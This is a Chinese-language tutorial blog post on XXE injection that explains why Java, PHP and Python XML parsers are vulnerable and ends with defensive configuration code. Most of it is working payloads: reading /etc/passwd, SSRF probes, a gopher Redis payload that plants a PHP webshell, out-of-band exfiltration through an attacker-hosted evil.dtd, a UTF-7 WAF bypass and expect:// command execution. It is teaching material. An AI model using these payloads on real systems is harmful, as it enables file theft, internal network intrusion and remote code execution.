---
title: XXE 漏洞原理与利用实战
date: 2026-06-18 22:00:00
tags:
- XXE
- XML
- Web 安全
- 注入
---

## 什么是 XXE

XXE（XML External Entity）是 XML 外部实体注入漏洞。当应用解析用户输入的 XML 且**未禁用外部实体**时，攻击者可以读取服务器文件、发起 SSRF 请求，甚至执行代码。

## XML 基础回顾

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <user>&xxe;</user>
</root>
```

关键元素：

| 部分 | 含义 |
|------|------|
| `<?xml?>` | XML 声明 |
| `<!DOCTYPE>` | 文档类型定义（DTD） |
| `<!ENTITY>` | 实体声明 |
| `&xxe;` | 实体引用，会被替换成实体内容 |
| `SYSTEM` | 外部资源标识符 |

## XXE 的核心：外部实体

```xml
<!ENTITY 实体名 SYSTEM "资源URI">
```

资源 URI 可以是：

```
file:///etc/passwd    → 读取本地文件
http://target/        → 发起 HTTP 请求（SSRF）
gopher://redis:6379   → TCP 协议交互
ftp://attacker.com/   → 外带数据
php://filter/...      → PHP 伪协议处理
```

## 漏洞产生的原因

```java
// 存在 XXE 的代码 — Java
DocumentBuilder db = DocumentBuilderFactory.newInstance().newDocumentBuilder();
Document doc = db.parse(new ByteArrayInputStream(xml.getBytes()));
// DocumentBuilder 默认允许外部实体！可以直接读取文件
```

```php
// 存在 XXE 的代码 — PHP
$xml = simplexml_load_string($_POST['data']);
echo $xml->user;
```

```python
# 存在 XXE 的代码 — Python
from lxml import etree
root = etree.fromstring(xml_data)  # lxml 默认允许外部实体
print(root.findtext('user'))
```

## 利用方式全解

### 方式一：文件读取（最基础）

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><user>&xxe;</user></root>
```

服务器返回中 `/etc/passwd` 会被替换到 `<user>` 位置。

### 方式二：SSRF — 内网探测

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:8080/admin">
]>
<root><user>&xxe;</user></root>
```

应用服务器以**自身身份**发起 HTTP 请求，可以探测内网服务、访问未公开接口。

```xml
<!-- 探测内网 Redis（6379） -->
<!ENTITY xxe SYSTEM "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a...">

<!-- 探测内网 MySQL（3306） -->
<!ENTITY xxe SYSTEM "dict://127.0.0.1:3306/">
```

### 方式三：XXE 结合 SSRF 打 Redis

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "gopher://127.0.0.1:6379/_*3%0d%0a...
  $3%0d%0aset%0d%0a$8%0d%0awebshell%0d%0a...
  $31%0d%0a%0a%0a%3c%3fphp%20system(%24_GET%5b1%5d)%3b%3f%3e%0a%0a%0d%0a...
  *4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a...
  $3%0d%0adir%0d%0a$13%0d%0a/var/www/html/%0d%0a...
  *1%0d%0a$4%0d%0asave%0d%0a">
]>
<root><user>&xxe;</user></root>
```

### 方式四：错误回显读取文件

当文件内容含特殊字符导致 XML 解析失败时，内容会出现在错误消息中：

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
  <!ENTITY trigger "file:///&xxe;/nonexistent">
]>
<root><user>&trigger;</user></root>
```

服务器返回类似：`file:///server-name\n/nonexistent`

### 方式五：OOB — 外带数据

适用于**无回显**（Blind XXE）场景。需要一台攻击者服务器。

**第一步**：攻击者服务器（VPS）上放 `evil.dtd`：

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://VPS:9999/?data=%file;'>">
%eval;
%exfil;
```

**第二步**：受害服务器发起请求外部 DTD：

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://VPS:9999/evil.dtd">
  %xxe;
]>
<root><user>test</user></root>
```

**效果**：服务器读取 `/etc/passwd` 后把内容拼到 URL 里请求攻击者服务器，攻击者从日志中看到文件内容。

### 方式六：DTD 参数实体 + UTF-7 绕过 WAF

有些 WAF 拦截 `DOCTYPE` 关键字。用 UTF-7 编码绕过：

```xml
<?xml version="1.0" encoding="UTF-7"?>
+ADw-+ACE-DOCTYPE+ACA-foo+ACA-+AFs-+ADw-+ACE-ENTITY+ACA-xxe+ACA-SYSTEM+ACA-+ACI-file:///flag+ACI-+AD4-+AF0-+AD4-+
```

### 方式七：PHP wrapper 实现 RCE

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/config.php">
]>
<root><user>&xxe;</user></root>
```

PHP 中还可以用 `expect://` 协议执行命令（需要安装 expect 扩展）：

```xml
<!ENTITY xxe SYSTEM "expect://id">
```

### 方式八：Java 特有协议

```xml
<!-- Classpath 资源读取 -->
<!ENTITY xxe SYSTEM "jar:file:///app/app.jar!/BOOT-INF/classes/application.properties">

<!-- 网路协议 -->
<!ENTITY xxe SYSTEM "netdoc:///flag">
```

## Blind XXE 的检测方法

无回显时，用 **OOB 带外** 或 **错误信息** 判断：

```xml
<!-- 通过错误信息判断注入存在 -->
<!ENTITY xxe SYSTEM "file:///nonexistent_file">

<!-- 通过 HTTP 请求判断（监听 VPS） -->
<!ENTITY xxe SYSTEM "http://VPS:9999/xxe_test">
```

## 防御方案

```java
// Java — 禁用外部实体
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```

```php
// PHP — 禁用外部实体
libxml_disable_entity_loader(true);
```

```python
# Python — 使用 defusedxml 替代 lxml
from defusedxml import lxml as safe_lxml
root = safe_lxml.fromstring(xml_data)
```

## 一句话总结

> **XXE = 用户输入的 XML 没关外部实体 → 通过 SYSTEM "file:///..." 读文件 + SSRF 内网探测 + OOB 外带数据。**
